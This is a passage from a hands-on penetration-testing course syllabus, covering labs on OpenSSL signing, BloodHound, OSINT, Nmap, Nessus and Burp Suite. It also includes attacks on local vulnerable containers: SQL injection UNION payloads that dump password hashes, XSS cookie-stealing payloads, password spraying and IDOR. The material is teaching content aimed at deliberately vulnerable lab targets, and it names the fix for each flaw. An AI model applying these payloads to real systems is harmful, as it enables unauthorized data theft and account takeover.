- [MDN - Base64](https://developer.mozilla.org/en-US/docs/Glossary/Base64) _(link)_

---

## L14: Generate RSA keypair with OpenSSL, sign & verify a file

**Week 5** · Module `m5` · OpenSSL / Terminal · medium

Every code-signing certificate, TLS handshake, and SSH key-based login rests on the same asymmetric trick you'll perform by hand here: a private key produces a signature that anyone holding only the matching public key can verify — never the reverse. You'll generate a real 2048-bit RSA keypair with OpenSSL, sign a test file's SHA-256 hash with the private key, and confirm 'Verified OK' using nothing but public.pem. Then you break it on purpose — append a byte to the file and re-run the identical verify command to watch 'Verification Failure' appear, proving the signature is bound to the exact original bytes, not just the file's existence. You come away able to generate, sign, and verify with OpenSSL from memory, and with a concrete mental model of what "verified" actually guarantees the next time a package manager or TLS handshake reports it.

**Completion evidence:** terminal output showing 'Verified OK' on the untouched file, followed by 'Verification Failure' after the file was modified, with both the sign and verify commands visible in scrollback

**Instructions:**

1. Generate a 2048-bit RSA private key: openssl genrsa -out private.pem 2048 (or the modern equivalent: openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out private.pem)
2. Derive the public key from it: openssl rsa -in private.pem -pubout -out public.pem
3. Inspect the key's modulus and exponent: openssl rsa -in private.pem -text -noout | head -20
4. Create a test file (echo 'integrity test' > file.txt) and sign its SHA-256 hash: openssl dgst -sha256 -sign private.pem -out file.sig file.txt
5. Inspect the signature bytes: xxd file.sig | head, noting it's a fixed-size binary blob regardless of the input file's length
6. Verify the signature using only the public key: openssl dgst -sha256 -verify public.pem -signature file.sig file.txt (expect 'Verified OK')
7. Modify file.txt slightly (echo 'tampered' >> file.txt) and re-run the verify command — confirm it now prints 'Verification Failure'
8. Try verifying file.sig against a *different* file's public key or a re-generated keypair's public key, and explain in one sentence why that also fails

**Resources:**

- [OpenSSL documentation](https://www.openssl.org/docs/) _(link)_
- [openssl-genpkey manual](https://docs.openssl.org/3.1/man1/openssl-genpkey/) _(link)_
- [openssl-dgst manual](https://docs.openssl.org/3.1/man1/openssl-dgst/) _(link)_
- [OpenSSL Cookbook: Key Generation (Feisty Duck)](https://www.feistyduck.com/library/openssl-cookbook/online/openssl-command-line/key-generation.html) _(link)_
- [CryptoHack](https://cryptohack.org) _(platform)_

---

## L15: Design a segmented corporate network diagram in draw.io

**Week 6** · Module `m6` · draw.io · medium

Before a security architect touches a firewall rule or a pentester runs a single Nmap scan, someone has to decide where the DMZ ends and the internal VLANs begin — get that segmentation wrong and a single compromised web server in the DMZ has a clear path to the domain controller. In draw.io, you'll build that decision from scratch: an internet edge behind a perimeter firewall, a DMZ web server, at least three internal VLANs with labelled CIDRs behind a Layer-3 switch, and an Active Directory domain controller wired to the VLANs it authenticates. You'll then annotate the NIST SP 800-207 Zero Trust controls that actually enforce the boundaries — IAM/MFA at the access edge, micro-segmentation between VLANs, IDS/IPS/WAF at the perimeter — and label which traffic flows are permitted between zones and which are denied. The exported diagram and its rationale paragraph are the same kind of artifact you'll hand a client, and the same baseline you'll later use to sanity-check what BloodHound and Nmap reveal about how the network actually behaves.

**Completion evidence:** exported PNG/PDF of the network diagram showing a labelled DMZ, at least 3 labelled VLANs with CIDRs, an Active Directory domain controller, IDS/IPS/WAF placement, and annotated Zero Trust controls with traffic-flow rules between zones

**Instructions:**

1. Open https://app.diagrams.net (draw.io) and start a new blank diagram, or use the built-in 'Basic Network' template
2. In the left shape panel, click 'More Shapes' -> enable the 'Networking' (and optionally AWS/Azure or Cisco) stencil libraries -> Apply
3. Add an internet edge (cloud shape) -> perimeter firewall -> a DMZ segment hosting a public-facing web server
4. Add at least 3 internal VLANs (e.g. HR, IT, Finance) connected through a Layer-3 switch/router, with each VLAN's subnet CIDR labelled
5. Add an Active Directory domain controller inside the internal network, connected to the VLANs it authenticates
6. Annotate Zero Trust controls: IAM/MFA at the access edge, micro-segmentation boundaries between VLANs, and IDS/IPS/WAF placement at the DMZ and perimeter
7. Use arrows/labels to show which traffic flows are permitted between zones (e.g. 'DMZ -> Internal: denied except port 443 to app tier')
8. Export the diagram as PNG or PDF (File -> Export as) and write a short paragraph explaining the traffic-flow rules and why each control is placed where it is

**Resources:**

- [draw.io / diagrams.net](https://app.diagrams.net) _(tool)_
- [draw.io: Drawing network and infrastructure diagrams](https://www.drawio.com/docs/diagram-types/network-diagrams/) _(link)_
- [draw.io: Network and technical diagram shapes](https://drawio-app.com/blog/network-and-technical-diagram-shapes-in-draw-io/) _(link)_
- [NIST SP 800-207: Zero Trust Architecture](https://csrc.nist.gov/pubs/sp/800/207/final) _(link)_
- [Cisco Networking Academy](https://www.netacad.com) _(platform)_

---

## L16: BloodHound: view AD graph, find path to Domain Admin

**Week 6** · Module `m6` · BloodHound · medium

BloodHound is the single tool that turns 'we popped one workstation' into 'we own the domain' in real Active Directory engagements, and this lab has you read its attack-path graph the way a red teamer does. You'll stand up BloodHound Community Edition via Docker, ingest SpecterOps' official sample dataset, and run the built-in 'Shortest Paths to Domain Admins' query to see the full chain from a low-privilege account to Domain Admin. Walking each edge — MemberOf, AdminTo, HasSession, GenericAll, ForceChangePassword — you'll tie ACL-type edges directly to the misconfigured-ACL privilege-escalation vector, and flag any Kerberoastable account whose service ticket could be cracked offline with Hashcat or John the Ripper without ever touching a login prompt. You finish able to read a BloodHound graph cold, name the exact relationship type behind each hop, and identify the single cheapest edge that — if removed — would break the entire path to Domain Admin.

**Completion evidence:** BloodHound graph screenshot showing the 'Shortest Paths to Domain Admins' query results with the full path highlighted node-to-node and every edge's relationship type visible

**Instructions:**

1. Install Docker Desktop (or Docker Engine + Compose), then stand up BloodHound CE with the official one-liner: curl -L https://ghst.ly/getbhce | docker compose -f - up
2. Watch the container logs for the randomly generated initial admin password, then log in at http://localhost:8080/ui/login
3. Download the official sample dataset from the BloodHound CE 'Ingest Sample Data' docs page
4. In the BloodHound UI, go to Administration -> File Ingest (or the Upload Files modal), drag in the sample data ZIP, and click Upload
5. Wait for ingestion to finish, then open Analysis (or Cypher Search) and run the pre-built 'Shortest Paths to Domain Admins' query
6. Click through the resulting graph edge by edge, noting each relationship type (MemberOf, AdminTo, HasSession, GenericAll, ForceChangePassword, etc.)
7. For any ACL-type edge (GenericAll, ForceChangePassword, WriteDacl, etc.) in the path, note that this is exactly the 'misconfigured ACL' privilege-escalation vector: attackers manipulate these permissions to gain unauthorized access or escalate privileges within the domain
8. Check whether any account in the path is flagged as Kerberoastable — in a real engagement this account's service ticket would be requested from AD and cracked offline with Hashcat or John the Ripper to recover its password without touching a login prompt
9. Identify the single cheapest/most-likely-to-be-missed edge in the path (e.g. a nested group membership or a GenericAll ACE)
10. Write a short summary of the attack path found and which single relationship, if removed, would break the chain to Domain Admin

**Resources:**

- [BloodHound CE Quickstart (SpecterOps)](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart) _(link)_
- [BloodHound CE: Ingest Sample Data](https://bloodhound.specterops.io/get-started/quickstart/ce-ingest-sample-data) _(link)_
- [BloodHound Example Data (GitHub wiki)](https://github.com/SpecterOps/BloodHound/wiki/Example-Data) _(link)_
- [BloodHound docker-compose example (GitHub)](https://github.com/SpecterOps/BloodHound/tree/main/examples/docker-compose) _(link)_
- [TryHackMe: Active Directory Basics](https://tryhackme.com/room/winadbasics) _(platform)_
- [BloodHound documentation](https://bloodhound.readthedocs.io) _(tool)_
- [HackTricks - Active Directory](https://book.hacktricks.xyz) _(link)_

---

## L17: Passive OSINT on a test domain

**Week 7** · Module `m7` · OSINT Framework · easy

Every real engagement's Rules of Engagement draws a hard line between passive recon — which never touches the target — and active scanning, which does, and blurring that line is one of the fastest ways to violate scope. This lab keeps you strictly on the passive side: pull registrar and nameserver data from WHOIS, harvest subdomains from crt.sh's Certificate Transparency logs, check Shodan's own pre-existing index for internet-facing hosts, fingerprint the hosting stack with Netcraft's Site Report, run Google Dorks for exposed documents, and query DNS records through a public resolver instead of the target's own server. Compiling all of it into one passive-recon report — and flagging exactly which findings would need active verification later — mirrors the deliverable a client actually receives before active testing is authorized. You walk away able to build a target's external footprint from public sources alone, and to articulate why each technique stayed passive.

**Completion evidence:** passive-recon report showing WHOIS output, crt.sh subdomain results, Shodan results, Netcraft site report, at least 3 Google Dork results, and DNS record lookups all compiled together

**Instructions:**

1. Run a WHOIS lookup on the target domain (whois target.com) to record registrar, creation date, and nameserver details
2. Search crt.sh for the domain (https://crt.sh/?q=target.com) to enumerate subdomains from Certificate Transparency logs, without touching the target directly
3. Search Shodan for hostname:"target.com" to enumerate internet-facing hosts/services already indexed by Shodan's own scanning
4. Use Netcraft's Site Report tool (https://sitereport.netcraft.com) to identify hosting provider, technology stack, and OS fingerprint
5. Run at least 3 Google Dork queries (e.g. site:target.com filetype:pdf, site:target.com intitle:"index of") to find exposed documents/directories
6. Check DNS records (A, MX, TXT, NS) with dig/nslookup against a public resolver, not the target's own DNS server
7. Compile all findings into a short passive-recon report: registrar/hosting, subdomains found, technologies fingerprinted, and any exposed documents
8. Flag anything that would need active verification later, and explain why it can't be confirmed passively

**Resources:**

- [OSINT Framework](https://osintframework.com) _(link)_
- [Shodan](https://www.shodan.io) _(tool)_
- [crt.sh Certificate Transparency search](https://crt.sh) _(tool)_
- [Netcraft Site Report](https://sitereport.netcraft.com) _(tool)_

---

## L18: Nmap: 5 scan types on a local Docker target

**Week 7** · Module `m7` · In-House Docker Range · medium

Host discovery, port scanning, service/version detection, default-script/NSE enumeration, and HTTP-specific scripting are the moves every engagement's recon phase runs before anyone touches an exploit, and Nmap does all of them from one binary. Working against a DVWA container the portal starts for you and maps to localhost:18080, you'll run -sn to confirm the host is live, -p- for a full 65535-port sweep, -sV for service/version banners, -sC for Nmap's default script set, and --script http-enum/http-headers for HTTP-specific NSE checks against the open web service. Saving each run with -oN builds the same paper trail a real report is built from: open ports, banners, and any interesting HTTP details the scripts flag. You leave with the core Nmap recon workflow committed to muscle memory, ready to point at any future authorized target.

**Docker:** `docker run -d -p 18080:80 ghcr.io/digininja/dvwa:latest`

**Completion evidence:** 5 saved terminal/log files (-oN outputs) showing host discovery, full port scan, version detection, default-script scan, and HTTP NSE script results all run against localhost:18080

**Instructions:**

1. Click 'Start Lab' above to launch the DVWA container, then confirm your target is localhost:18080 — a target you started yourself, so there's no scan-rate limit or authorization to arrange
2. Host discovery: nmap -sn localhost to confirm the host is live
3. Full TCP port scan across all 65535 ports: sudo nmap -p- -T4 localhost
4. Version detection against the discovered open port: nmap -sV -p<open-ports> localhost
5. Default-script scan (Nmap's -sC safe script set) against the same ports: nmap -sC -p<open-ports> localhost
6. HTTP-specific NSE scripts against the web service: nmap --script http-enum,http-headers -p18080 localhost
7. Save all 5 outputs with -oN <name>.txt so you have a paper trail per scan type
8. Document every open port, service/version banner, and any interesting HTTP detail flagged by the default and http-* scripts

**Resources:**

- [Nmap official docs (Reference Guide)](https://nmap.org/book/man.html) _(link)_
- [Nmap NSE http category docs](https://nmap.org/nsedoc/categories/http.html) _(link)_
- [Nmap NSE default category docs](https://nmap.org/nsedoc/categories/default.html) _(link)_
- [scanme.nmap.org — Nmap's own authorized public target (optional extra practice)](https://scanme.nmap.org) _(platform)_
- [TryHackMe Nmap rooms](https://tryhackme.com) _(platform)_

---

## L19: Nessus: install & scan a local Docker target

**Week 7** · Module `m7` · Nessus Essentials · medium

A vulnerability scanner like Nessus can surface in minutes what would take far longer to enumerate manually with Nmap alone — but only if you know how to triage the flood of findings it returns by severity before acting on any of them. Nessus Essentials is a free tool you install locally (no external account beyond a one-time activation email, and no cloud target required), and here you'll point it at a DVWA container the portal starts for you on localhost:18080. Once the scan completes, you'll group the results by Critical/High/Medium/Low, then pull the top 3 findings, look up each one's CVE, and write remediation guidance for it — the exact triage step that separates a scan report from an actionable one. You finish able to run and interpret a full Nessus scan end to end, and to prioritize findings the way a real assessment does.

**Docker:** `docker run -d -p 18080:80 ghcr.io/digininja/dvwa:latest`

**Completion evidence:** Nessus scan results screen showing the completed Basic Network Scan against localhost:18080 grouped by severity (Critical/High/Medium/Low), with the top 3 findings' names and CVE IDs visible

**Instructions:**

1. Register for a free Nessus Essentials activation code at tenable.com/products/nessus/nessus-essentials and check email for the code
2. Download and install Nessus for your OS, then complete setup at https://localhost:8834, entering the activation code when prompted
3. Click 'Start Lab' above to launch the DVWA container, and confirm it's reachable at http://localhost:18080
4. In Nessus, click New Scan -> Basic Network Scan, name it, and set the target to localhost:18080
5. Launch the scan and wait for it to complete (a single small container typically finishes in a few minutes)
6. Review results grouped by severity (Critical/High/Medium/Low) in the scan's Vulnerabilities tab
7. Pick the top 3 findings by severity, look up each one's corresponding CVE and remediation guidance, and write one paragraph per finding

**Resources:**

- [Nessus Essentials (free)](https://www.tenable.com/products/nessus/nessus-essentials) _(tool)_
- [Tenable Nessus install/activation docs](https://docs.tenable.com/nessus/Content/InstallNessusEssentialsProfessionalExpertOrManager.htm) _(link)_
- [Tenable: Manage Activation Code](https://docs.tenable.com/nessus/Content/ManageActivationCode.htm) _(link)_
- [Metasploitable2](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/) _(tool)_

---

## L20: Step-by-step Burp Suite setup

**Week 8** · Module `m8` · Burp Suite · easy

Every professional web app pentest begins the same way: an intercepting proxy sitting between the browser and the target, decrypting HTTPS on the fly so every request can be seen and edited before it leaves the machine. This lab builds that exact setup — Burp Suite Community Edition routed through Firefox via FoxyProxy, with Burp's CA certificate trusted so HTTPS traffic decrypts cleanly with no browser warnings. It is infrastructure, not a warm-up: every later lab in this course (L21 through L32) and every real engagement assumes this proxy chain already works. You walk away able to stand up a working intercept setup from scratch and prove it with a captured HTTPS request in Proxy > HTTP history.

**Completion evidence:** Screenshot of Burp Suite's Proxy > HTTP history tab showing a captured HTTPS request (status 200) to a real site, taken with FoxyProxy enabled in Firefox and no 'certificate not trusted' warning displayed.

**Instructions:**

1. Download and install Burp Suite Community Edition from portswigger.net/burp/communitydownload
2. Launch Burp, accept the license, choose 'Temporary project' and 'Use Burp defaults', then click Start Burp
3. In Burp go to Proxy > Proxy settings and confirm a proxy listener is running on 127.0.0.1:8080
4. In Firefox, install the 'FoxyProxy Standard' extension from addons.mozilla.org
5. In FoxyProxy's options, add a new proxy titled 'Burp' with IP 127.0.0.1 and port 8080, save it, then click the FoxyProxy toolbar icon and select it to route all Firefox traffic through Burp
6. With FoxyProxy enabled, browse to http://burp (or http://127.0.0.1:8080) and click 'CA Certificate' in the top-right to download cacert.der
7. In Firefox go to Settings > Privacy & Security > Certificates > View Certificates > Authorities tab > Import, select cacert.der, and check 'Trust this CA to identify websites'
8. In Burp, go to Proxy > Intercept and confirm 'Intercept is off' so traffic flows through passively for this test
9. Browse to any HTTPS site in the FoxyProxy-enabled Firefox and confirm the padlock shows no warning and the request appears in Proxy > HTTP history
10. Screenshot Burp's HTTP history showing at least one captured HTTPS request/response pair as evidence of a working intercept setup

**Resources:**

- [Burp Suite Community Edition download](https://portswigger.net/burp/communitydownload) _(tool)_
- [PortSwigger: Installing Burp's CA certificate in Firefox](https://portswigger.net/burp/documentation/desktop/external-browser-config/certificate/ca-cert-firefox) _(link)_
- [PortSwigger: Configuring Firefox to work with Burp](https://portswigger.net/burp/documentation/desktop/external-browser-config/browser-config-firefox) _(link)_
- [FoxyProxy Standard (Firefox add-on)](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/) _(tool)_
- [PortSwigger Web Academy](https://portswigger.net/web-security) _(platform)_
- [FoxyProxy](https://getfoxyproxy.org) _(tool)_

---

## L21: Burp Intercept: capture login request on DVWA

**Week 8** · Module `m8` · Burp Suite / DVWA · easy

A login form's HTML only constrains what a browser will submit -- it does nothing to stop a request from being rewritten in flight, which is exactly how parameter-tampering and business-logic bugs get found on real engagements. This lab stands up DVWA in Docker, switches Burp's Intercept on, and catches the raw login POST -- username, password, and PHPSESSID cookie -- before it ever reaches the server, then edits the password parameter directly and forwards the tampered version. Comparing that against a normal pass-through request with Intercept off makes the lesson concrete: the server trusts whatever arrives on the wire, not what the form UI implies. You leave with the core proxy workflow every later attack in this course -- SQLi, XSS, IDOR -- depends on: intercept, edit, forward.

**Docker:** `docker run -d -p 18080:80 ghcr.io/digininja/dvwa:latest`

**Completion evidence:** Screenshot of Burp's Proxy > Intercept panel showing the raw DVWA login POST request with the password parameter visibly edited to a different value, prior to clicking Forward.

**Instructions:**

1. Pull and run the DVWA container: docker run -d --name dvwa -p 8080:80 ghcr.io/digininja/dvwa:latest
2. Browse to http://localhost:8080, click 'Create / Reset Database', and wait for setup to finish
3. Log in with the default credentials admin / password
4. Go to DVWA Security (left nav) and set Security Level to Low, then click Submit
5. With FoxyProxy enabled and Burp's Proxy > Intercept switched to 'Intercept is on', log out and resubmit the DVWA login form
6. Observe the captured raw POST request in Burp, including the username and password parameters and the PHPSESSID cookie
7. Right-click the intercepted request and choose 'Send to Repeater' to keep a copy for later, then modify the password parameter's value directly in the Intercept view
8. Click Forward to send the tampered request and observe DVWA's response (invalid login message)
9. Repeat once more with Intercept off to compare normal end-to-end traffic against the intercepted/tampered version
10. Screenshot the intercepted request showing your edited password parameter before you clicked Forward

**Resources:**

- [DVWA GitHub repository](https://github.com/digininja/DVWA) _(tool)_
- [DVWA container image (GHCR)](https://github.com/digininja/DVWA/pkgs/container/dvwa) _(tool)_
- [PortSwigger: Using Burp Proxy](https://portswigger.net/burp/documentation/desktop/getting-started/proxy-intercept-traffic) _(link)_
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) _(link)_
- [PortSwigger Burp Proxy documentation](https://portswigger.net/burp/documentation/desktop/tools/proxy) _(link)_

---

## L22: Burp Repeater: manual SQLi test on DVWA

**Week 8** · Module `m8` · Burp Suite · medium

SQL injection still routinely turns a single unsanitized input field into a full database dump, and DVWA's SQL Injection page -- deliberately vulnerable across three difficulty levels -- mirrors exactly that failure mode. This lab uses Burp Repeater to manually break the WHERE clause with 1' OR '1'='1, find the column count with an ORDER BY probe, and build a UNION SELECT payload that pulls password hashes straight out of the users table, then repeats the attack against DVWA's Medium and High filters, adapting the payload as quotes get stripped and input gets restricted to a numeric-only pattern. Working through all three levels by hand builds the exact discipline real-world SQLi hunting requires: form a hypothesis, send one modified request, read the response diff, adjust. You come away able to manually fingerprint and exploit a SQL injection point without leaning on an automated scanner.

**Docker:** `docker run -d -p 18080:80 ghcr.io/digininja/dvwa:latest`

**Completion evidence:** Burp Repeater response pane showing the DVWA SQL Injection page returning user password hashes via a successful UNION-based payload, captured for at least the Low security level.

**Instructions:**

1. Run DVWA in Docker (docker run -d --name dvwa -p 8080:80 ghcr.io/digininja/dvwa:latest), create the database, log in as admin/password, and set Security Level to Low
2. Open DVWA's SQL Injection page, submit User ID '1', capture the request in Burp Proxy, and send it to Repeater (Ctrl+R)
3. In Repeater, change the id parameter to 1' OR '1'='1 and send it; note that all users are returned instead of just user 1
4. Determine the column count with an ORDER BY probe: 1' ORDER BY 3-- - , increasing the number until the query errors
5. Once the column count is known, build a UNION payload, e.g. 1' UNION SELECT user, password FROM users-- - , and confirm the password hashes appear in the response
6. Use Repeater's 'Ctrl+U' URL-encode-selection shortcut on the payload before sending if DVWA rejects an un-encoded space or comment sequence
7. Switch DVWA Security Level to Medium, repeat the same UNION payload, and note which characters/keywords are now filtered (e.g. stripped quotes) and how you adapt the payload
8. Switch to High, repeat again, and note the additional restriction (input must match a numeric regex) and the technique needed to bypass it
9. Save each Repeater request/response pair as evidence for Low, Medium, and High
10. Write a one-line summary per level: payload used, and whether it succeeded

**Resources:**

- [DVWA GitHub repository](https://github.com/digininja/DVWA) _(tool)_
- [DVWA container image (GHCR)](https://github.com/digininja/DVWA/pkgs/container/dvwa) _(tool)_
- [PayloadsAllTheThings: SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) _(link)_
- [PortSwigger: Using Burp Repeater](https://portswigger.net/burp/documentation/desktop/tools/repeater) _(link)_
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) _(link)_
- [PortSwigger - SQL injection](https://portswigger.net/web-security/sql-injection) _(platform)_

---

## L23: Burp Intruder: password spray on DVWA

**Week 8** · Module `m8` · Burp Suite / DVWA · medium

Weak and reused passwords remain one of the most common ways real accounts get taken over, and password-spray attacks are exactly how attackers -- and authorized pentesters -- find them at scale. This lab points Burp Intruder's Sniper mode at DVWA's login form, marks only the password parameter, loads a short candidate list, and sets a Grep-Match rule that flags the one response where the login-failure string disappears. Sorting the results grid isolates the working credential far faster than checking each response by hand, and the lab makes explicit why the attack is practical at all: the endpoint never throttles or locks out repeated failures. You leave able to build an Intruder Sniper attack with a working success condition against any login form that lacks rate-limiting.

**Docker:** `docker run -d -p 18080:80 ghcr.io/digininja/dvwa:latest`

**Completion evidence:** Screenshot of Burp Intruder's results grid with the Grep-Match column checked for exactly one row, and that row's payload confirmed as a working DVWA login credential.

**Instructions:**

1. Run DVWA in Docker, create the database, and log out so the login form is reachable
2. With Intercept on, submit the login form once to capture the raw POST request, then send it to Intruder (Ctrl+I)
3. In Intruder's Positions tab, clear all default payload markers, then mark only the password parameter's value and confirm Attack type is 'Sniper'
4. In the Payloads tab, choose payload set 1, type 'Simple list', and add a short list of common passwords (e.g. password, admin, password123, letmein, dvwa)
5. In the Options tab, add a Grep - Match rule for a string that appears only after a successful login (e.g. 'index.php' redirect text or 'Login failed' to invert the logic)
6. Click Start attack and let it run against all payloads in the list
7. Sort the results grid by the Grep-Match column to find the one request where the failure string is absent (or the success string is present)
8. Confirm the finding by logging in manually with that password
9. Document the working credential and note why an unthrottled login endpoint makes this attack practical

**Resources:**

- [DVWA GitHub repository](https://github.com/digininja/DVWA) _(tool)_
- [DVWA container image (GHCR)](https://github.com/digininja/DVWA/pkgs/container/dvwa) _(tool)_
- [PortSwigger: Using Burp Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder) _(link)_
- [SecLists common passwords wordlists](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials) _(link)_

---

## L24: Mutillidae II: XSS across three contexts with the hint system

**Week 9** · Module `m9` · Mutillidae · medium

Cross-site scripting shows up as reflected, persistent, and DOM-based -- three structurally different injection points that each need their own payload and their own fix. Mutillidae II is the OWASP target built for exactly this comparison: an adjustable security-level slider (0 = insecure, higher = filtered) and a built-in hint system on every page, all running locally with no external account. You drive the same attacker goal -- fire JavaScript and reach the session cookie -- through Mutillidae's three distinct XSS pages: Reflected (First Order) via an input echoed straight back, Persistent (Second Order) via a stored blog entry that fires for every later visitor, and DOM-Based where the payload never touches the server. Then you raise the security level and watch which payloads the filter now strips, adapting each one to an event-handler vector. Because the fix differs by context -- output encoding for reflected, stored-input sanitisation for persistent, a safe DOM sink for DOM-based -- you leave able to name which XSS you're facing and the exact defense it demands, not just fire one canned script tag.

**Docker:** `docker run -d -p 18080:80 citizenstig/nowasp`

**Completion evidence:** Screenshots of an alert() firing on each of Mutillidae's three XSS pages -- Reflected (First Order), Persistent (Second Order), and DOM-Based -- at security level 0, plus one screenshot showing the same payload neutralised after the security level was raised.

**Instructions:**

1. Click 'Start Lab' above, then browse to http://localhost:18080/ and, on first run only, visit http://localhost:18080/set-up-database.php and click the setup button to initialise Mutillidae's database
2. Confirm the top toolbar shows Security Level 0 and that hints are enabled (Toggle Hints), so you can lean on the built-in guidance for the first pass
3. Reflected XSS: open OWASP 2013 -> A3 - Cross Site Scripting (XSS) -> Reflected (First Order) (e.g. the DNS Lookup or User Lookup page), submit <script>alert(document.cookie)</script> in the input field, and confirm the alert fires from the reflected response
4. Persistent XSS: open A3 -> Persistent (Second Order) -> Add to your blog, post a blog entry containing <script>alert('stored')</script>, then reload View Blogs and confirm the script fires for every viewer of the blog, not just you
5. DOM-Based XSS: open A3 -> DOM-Based, inject a payload such as <img src=x onerror=alert('dom')> into the parameter that client-side JavaScript reads and writes into the DOM, and confirm it executes with no server round-trip
6. Raise the security level to 1 (then higher) from the toolbar and re-attempt each of the three payloads; note exactly what the filter now strips (e.g. the literal <script> tag) and adapt with an event-handler vector such as <svg onload=alert(1)> or <img src=x onerror=alert(1)>
7. For each of the three contexts, write one sentence naming the fix it needs: output encoding (reflected), stored-input sanitisation (persistent), or a safe DOM sink (DOM-based)
8. Screenshot each firing alert, plus one screenshot of a payload being neutralised after you raised the security level

**Resources:**

- [OWASP Mutillidae II (GitHub)](https://github.com/webpwnized/mutillidae) _(tool)_
- [Mutillidae user guide (wiki)](https://github.com/webpwnized/mutillidae/wiki) _(link)_
- [OWASP: Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) _(link)_
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) _(link)_
- [PortSwigger: Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) _(link)_
- [Burp Suite](https://portswigger.net/burp) _(tool)_
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) _(link)_

---

## L25: DSVW: raw-request SQL injection you can read the source for

**Week 9** · Module `m9` · DSVW · medium

SQL injection is easiest to truly understand when you can see both the injected request and the exact line of code that mishandles it. Damn Small Vulnerable Web is a single ~100-line Python file, so this lab pairs a focused SQLi exploit with reading the very query that made it possible. Working entirely from raw HTTP (browser address bar, curl, or Burp -- DSVW has almost no UI to hide behind), you hit its SQLite-backed endpoint, break the WHERE clause, determine the column count, and run a UNION SELECT to dump the users table, then open DSVW's source to find the string-formatted query behind the bug and state the one-line fix. Because DSVW builds its query with naive Python string formatting and no parameterisation, the exploit and its root cause sit side by side. You leave able to exploit UNION-based SQLi from raw requests and point to the exact code pattern that caused it.

**Docker:** `docker run -d -p 18080:8000 appsecco/dsvw`

**Completion evidence:** The raw HTTP response (browser or curl) showing DSVW returning username/password rows from a UNION-based SQL injection payload, paired with the specific line of DSVW's Python source that built the query via string formatting.

**Instructions:**

1. Click 'Start Lab' above, then browse to http://localhost:18080/ to see DSVW's landing page listing its vulnerability categories, and locate the SQL injection endpoint (a request of the form /?id=1)
2. Send /?id=1 and note the normal single-row response -- this is the query you'll be manipulating
3. Break the WHERE clause with /?id=1 OR 1=1 (URL-encode the space as %20 if needed) and confirm more rows return than the single expected record
4. Determine the column count with a UNION probe -- /?id=1 UNION SELECT NULL-- , adding NULLs until the query stops erroring -- since DSVW's SQLite query has a fixed column count you must match
5. Once the column count matches, dump credentials with a UNION SELECT pulling the username and password columns from the users table -- DSVW's base query returns four columns (id, username, name, surname), so your UNION must select four too, e.g. /?id=-1 UNION SELECT NULL, username, password, NULL FROM users -- and record the returned rows
6. Open DSVW's single-file source (linked in Resources, or view it inside the container) and find the exact line that builds the SQL query with Python string formatting rather than a parameterised query
7. Write two sentences: the working UNION payload, and the one-line code change (a parameterised query with bound parameters) that would have prevented it

**Resources:**

- [DSVW (GitHub)](https://github.com/appsecco/dsvw) _(tool)_
- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) _(link)_
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) _(link)_
- [PayloadsAllTheThings: SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) _(link)_
- [PortSwigger: SQL injection](https://portswigger.net/web-security/sql-injection) _(link)_
- [sqlmap](https://github.com/sqlmapproject/sqlmap) _(tool)_
- [Burp Suite](https://portswigger.net/burp) _(tool)_

---

## L26: Mutillidae II: IDOR and missing function-level access control

**Week 9** · Module `m9` · Mutillidae · medium

Most broken-access-control bugs are one of two failures -- an object reference you can change to reach data that isn't yours, or a privileged page that is hidden rather than actually guarded. Mutillidae II has both, laid out under its OWASP category menu with a security-level slider and built-in hints, so you can prove each locally without cracking a single password. You exploit an Insecure Direct Object Reference by changing a user/account id parameter to view a record that isn't yours, then exploit Missing Function-Level Access Control by browsing straight to a privileged page whose only 'protection' was that the UI never linked to it. Then you raise the security level and confirm the same two requests are now rejected server-side, isolating exactly where the real fix belongs. Neither step guesses a credential -- the flaw is architectural, exactly like the real-world version -- so you leave able to tell access control that is merely obscured from access control that is actually enforced.

**Docker:** `docker run -d -p 18080:80 citizenstig/nowasp`

**Completion evidence:** Screenshots showing (a) another user's data returned after changing only an id/user parameter (IDOR) and (b) a privileged Mutillidae page reached directly by URL with no admin login, both at security level 0, plus confirmation that raising the security level blocks the same two requests.

**Instructions:**

1. Click 'Start Lab' above, then browse to http://localhost:18080/ and, on first run only, visit http://localhost:18080/set-up-database.php and click the setup button; confirm the toolbar shows Security Level 0 with hints enabled
2. IDOR: open OWASP 2013 -> A4 - Insecure Direct Object References -> View Someone's Blog (or the view-user / account page), then change the user/blogger/id parameter in the request to another value and confirm you can read a record that isn't yours
3. Capture the request in Burp (or simply edit the URL) and show that ONLY the id parameter changed -- you never logged in as the victim
4. Missing Function-Level Access Control: open OWASP 2013 -> A7 - Missing Function Level Access Control and reach a privileged page (e.g. an admin / user-management or 'secret' page) directly by its URL, with no admin login
5. Raise the security level from the toolbar and re-send both requests; confirm the IDOR now returns only your own record and the privileged page now rejects the unauthenticated request
6. For each of the two findings, write one sentence naming the missing server-side check: an ownership check tying the id to your session (IDOR), and a role check on the privileged function (missing function-level access control)
7. Screenshot both successful accesses at level 0, plus the two rejections after you raised the level

**Resources:**

- [OWASP Mutillidae II (GitHub)](https://github.com/webpwnized/mutillidae) _(tool)_
- [Mutillidae user guide (wiki)](https://github.com/webpwnized/mutillidae/wiki) _(link)_
- [OWASP Broken Access Control (Top 10 A01)](https://owasp.org/Top10/A01_2021-Broken_Access_Control/) _(link)_
